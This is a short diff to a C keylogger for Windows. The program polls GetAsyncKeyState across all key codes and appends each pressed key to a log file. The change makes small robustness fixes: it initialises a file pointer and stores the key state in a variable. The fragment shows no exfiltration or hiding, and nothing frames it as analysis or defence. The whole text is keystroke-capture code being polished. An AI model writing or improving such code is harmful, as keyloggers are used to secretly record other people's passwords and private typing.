@@ -84,7 +84,7 @@ const char* get_key_name(int key) {
 
 
 bool log_keystroke(int key) {
-    FILE *file;
+    FILE *file = NULL; // Initialize file to NULL
     errno_t err = fopen_s(&file, LOG_FILE, "a");
     if (err != 0 || file == NULL) {
         char error_message[MAX_ERROR_MESSAGE_LENGTH];
@@ -126,7 +126,8 @@ int main() {
 
     while (1) {
         for (key = 1; key < NUM_KEYS; key++) {
-            if (GetAsyncKeyState(key) & 0x8000) {
+            SHORT keyState = GetAsyncKeyState(key);
+            if (keyState & 0x8000) {
                 if (!key_pressed[key]) {
                     if (!log_keystroke(key)) {
                         fprintf(stderr, "Error logging keystroke for key %d\n", key);
